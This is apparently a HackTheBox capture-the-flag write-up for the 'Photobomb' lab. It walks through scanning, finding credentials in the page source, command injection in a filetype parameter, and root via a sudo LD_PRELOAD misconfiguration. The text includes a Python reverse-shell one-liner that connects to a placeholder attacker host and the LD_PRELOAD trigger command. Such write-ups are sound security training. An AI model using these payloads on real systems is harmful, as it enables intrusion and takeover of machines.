# photobomb-htb-writeup
A free lab from **HackTheBox**, can be found in here if still available: https://app.hackthebox.com/machines/Photobomb

![Photobomb](https://user-images.githubusercontent.com/31168741/201704551-e765c5a7-c32e-43a4-bebc-23ff5f1825c7.png)

## User Own:
Setting up VPN to access lab by the following command:

`sudo openvpn [your.ovpn file]`

![1](https://user-images.githubusercontent.com/31168741/201707116-98e6a13c-2509-4771-9f91-15d231bf138e.PNG)

Activate machine.

![2](https://user-images.githubusercontent.com/31168741/201707154-ec4302dc-20a5-476e-8208-4502d0d672aa.PNG)

Check if it's connected.

![3](https://user-images.githubusercontent.com/31168741/201707188-ddf40cfa-5c10-4bb8-a89d-66c3c97f88e4.PNG)

Run nmap scan to find more information regarding the machine. `sudo nmap -sS -A -p- [machine-ip] -T4` 

![4](https://user-images.githubusercontent.com/31168741/201707217-7ce7997e-73c7-4c6d-956d-3f94bfa7d552.PNG)

Following the scan report above, let's check the ip in browser since it shows has the '80' port open.

![5](https://user-images.githubusercontent.com/31168741/201709583-ff4725a7-670d-48db-8f89-579762570e65.PNG)

Oops! If you ever face issues like this, just do the following:

`sudo nano /etc/hosts`

Type:

>[machine-ip] [domain-address]

![6](https://user-images.githubusercontent.com/31168741/201709609-1540dace-f0e3-40f7-ac46-b5d5c287da7c.PNG)

It worked!

![7](https://user-images.githubusercontent.com/31168741/203564356-ed8d8a73-8c2e-467b-8e79-df37fcdbf1b9.PNG)

Look here and there to find sufficient clues around. I'm running some more tools such as:

`dirsearch -u http://[machine-ip]`<br>

![11](https://user-images.githubusercontent.com/31168741/203568024-106123d0-9112-4ba7-a00c-df39b63725c2.PNG)

From the above found directories:

![10](https://user-images.githubusercontent.com/31168741/203569553-e7f4929d-10ea-45ac-a2f3-fe908b3ea09a.PNG)

Let's look around for clues as to where we can find the credentials. Viewing page sources & inspecting might act benefitting.

![8](https://user-images.githubusercontent.com/31168741/203569838-840fdb47-9844-488d-ad27-52ea89d1ecb8.PNG)

![12](https://user-images.githubusercontent.com/31168741/203569955-c4b4ff0a-c559-4ac0-8cea-45ba2d020224.PNG)

![13](https://user-images.githubusercontent.com/31168741/203570043-aa69c1e7-9556-4aa9-99b0-29c5bd9fc72d.PNG)

Found user and pass. Let's try logging in!

![14](https://user-images.githubusercontent.com/31168741/203570096-e413c8e3-98ee-45bf-bfef-0ea898d786de.PNG)

It worked. What we see is a page with few pictures to download. Let's try incepting the request using burp and see if anything vulnerable found.

![15](https://user-images.githubusercontent.com/31168741/203583327-0ad20b7d-949b-42a4-bc93-349544843706.PNG)
![16](https://user-images.githubusercontent.com/31168741/203583637-609ce260-e0ec-451e-a2f7-9daa83257543.PNG)
![17](https://user-images.githubusercontent.com/31168741/203583725-4b26b2a4-b0d3-45c8-a372-97394cf4a093.PNG)

Tampering with the parameters for the POST request and find that the filetype parameter might be injectable. So, we prepare a python reverse shell and place in filetype section and send the request.

![18](https://user-images.githubusercontent.com/31168741/203584234-6073bc41-3f86-41a7-a2c3-9fe9cd38dbf4.PNG)

The reverse shell: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("[LHOST]",[LPORT]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'`

![29](https://user-images.githubusercontent.com/31168741/203584370-2ec4ea71-7176-41c0-bbb0-7c373f8f4df9.PNG)
![19](https://user-images.githubusercontent.com/31168741/203584398-ba1628ea-8b44-4fa6-95f1-58abb8b8d6e7.PNG)

We're in the target machine. Looking a little here and there helped me with the user flag!

![20](https://user-images.githubusercontent.com/31168741/203584616-86f9d8fe-7590-4c27-938b-10b1f34d6690.PNG)

Second, to own the system, let's check the sudo rights: `sudo -l`.

![21](https://user-images.githubusercontent.com/31168741/203584890-1a8e1b17-0468-4ece-9b32-3eaf5c5b82c0.PNG)

LD_PRELOAD can be invoked with sudo, let’s create a simple PE shell to exploit this.

![22](https://user-images.githubusercontent.com/31168741/203585120-960af202-007e-419a-ab08-88f12e474960.PNG)
![25](https://user-images.githubusercontent.com/31168741/203585279-40c47a8f-d436-4fec-bc14-03ff8b146e7e.PNG)

Compile the file.

![27](https://user-images.githubusercontent.com/31168741/203585320-d15b7a67-3a79-47a3-9e1f-2be25eff6950.PNG)

Now, upload it to the target machine through python server.

![23](https://user-images.githubusercontent.com/31168741/203585445-42a08f82-64b7-485f-bb6a-6442790c1026.PNG)
![24](https://user-images.githubusercontent.com/31168741/203585498-5daf23df-1f33-458d-a738-c13ca080131c.PNG)

Now the exploit is in the target machine. Trigger the shell to enter as root: `sudo LD_PRELOAD=/home/wizard/shell.so /opt/cleanup.sh`

![28](https://user-images.githubusercontent.com/31168741/203585818-397e1d19-ce2f-4080-88b8-76813f5d7e00.PNG)

Operating as root! We found root flag!
